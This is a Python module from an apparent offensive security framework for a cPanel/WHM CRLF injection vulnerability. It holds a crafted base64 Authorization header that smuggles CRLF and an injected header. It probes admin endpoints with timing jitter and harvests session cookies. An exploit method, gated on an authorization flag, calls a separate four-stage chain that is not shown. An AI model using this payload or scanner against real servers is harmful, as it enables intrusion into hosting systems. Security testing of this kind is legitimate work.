# Made by Sn0w8ird
"""CVE-2026-41940 — cPanel/WHM CRLF/session research module."""

from __future__ import annotations

import asyncio
import os
import random
from typing import List, Optional

from cpointed.core.crypto import random_token
from cpointed.core.engine import Target, TargetType
from cpointed.core.exceptions import SessionError, UnauthorizedOperationError
from cpointed.core.session import CPointedClient
from cpointed.exploit.runners.cpanel_41940 import run_four_stage_chain
from cpointed.modules.base import VulnerabilityModule


class CVE202641940(VulnerabilityModule):
    name = "CVE-2026-41940"
    severity = 9.8
    affected_versions = [
        "cPanel/WHM trains per vendor advisory (e.g. 11.110.0.97+)",
    ]
    cwe = "CWE-93 (CRLF Injection)"

    def __init__(self) -> None:
        self.gadgets: List[str] = [
            "/scripts2/listaccts",
            "/scripts2/doexpunge",
            "/cpanel/login",
            "/json-api/listaccts",
        ]

    def applies_to(self, target: Target) -> bool:
        if target.target_type is None:
            return True
        return target.target_type in (
            TargetType.CPANEL,
            TargetType.WHM,
            TargetType.WP_SQUARED,
        )

    async def _jitter(self) -> None:
        await asyncio.sleep(random.uniform(0.2, 1.5))

    async def _mint_session_cookie(self, client: CPointedClient, timeout: float) -> Optional[str]:
        for path in ("/", "/login/", "/cpanel/", "/unprotected/cpanel/logo"):
            try:
                r = await client.request("GET", path, timeout=timeout)
            except SessionError:
                continue
            cookies = [v for k, v in r.headers.multi_items() if k.lower() == "set-cookie"]
            if not cookies:
                continue
            for c in cookies:
                low = c.lower()
                if "session" in low or "cpsess" in low or "cptest" in low:
                    return c.split(";", 1)[0].strip()
            return cookies[0].split(";", 1)[0].strip()
        return None

    def _authz_crlf_value(self, marker: str) -> str:
        import base64

        inner = f"root:x\r\nX-CPointed-Probe:{marker}\r\n"
        return base64.b64encode(inner.encode("utf-8")).decode("ascii")

    async def _probe_gadget(
        self,
        client: CPointedClient,
        path: str,
        marker: str,
        cookie: Optional[str],
        timeout: float,
    ) -> tuple[bool, dict]:
        headers: dict = {"Authorization": f"Basic {self._authz_crlf_value(marker)}"}
        if cookie:
            headers["Cookie"] = cookie
        try:
            resp = await client.request("GET", path, headers=headers, timeout=timeout)
        except SessionError as exc:
            return False, {"error": str(exc), "path": path}

        text = ""
        try:
            text = resp.text
        except Exception:  # pragma: no cover
            text = ""

        hdr_blob = "\n".join(f"{k}: {v}" for k, v in resp.headers.multi_items())
        body_lower = text.lower()
        marker_lower = marker.lower()

        reflected = marker_lower in body_lower or marker_lower in hdr_blob.lower()
        suspicious = marker in hdr_blob
        return bool(reflected or suspicious), {
            "status_code": resp.status_code,
            "path": path,
            "reflected": reflected,
            "headers_contain_marker": suspicious,
        }

    async def check(self, target: Target, *, timeout: float = 30.0):
        if target.metadata.get("scan_dry_run"):
            return self._result(
                target,
                False,
                0.0,
                {"scan_dry_run": True, "note": "CRLF gadget probes skipped; enable full scan without --dry-run."},
            )

        client = CPointedClient(target)
        marker = f"cpointed_{random_token(6)}"
        evidence: List[str] = []
        details: dict = {"marker": marker, "gadgets": []}

        await self._jitter()
        cookie = await self._mint_session_cookie(client, timeout)
        if cookie:
            details["session_hint"] = cookie[:48] + ("..." if len(cookie) > 48 else "")

        any_hit = False
        for path in self.gadgets:
            await self._jitter()
            hit, info = await self._probe_gadget(client, path, marker, cookie, timeout)
            details["gadgets"].append(info)
            if hit:
                any_hit = True
                evidence.append(f"{path}: CRLF/marker anomaly (heuristic)")

        return self._result(
            target,
            vulnerable=any_hit,
            score=self.severity,
            details=details,
            evidence=evidence or None,
        )

    async def exploit(self, target: Target, **kwargs):
        if os.environ.get("CPOINTED_AUTHORIZED") != "1":
            raise UnauthorizedOperationError(
                "Set CPOINTED_AUTHORIZED=1 only for systems you own or have explicit written permission to test."
            )
        tmo = float(kwargs.get("timeout") or 30)
        dry = bool(kwargs.get("dry_run")) or os.environ.get("CPOINTED_EXPLOIT_DRY") == "1"
        return await run_four_stage_chain(target, timeout=tmo, dry_run=dry)
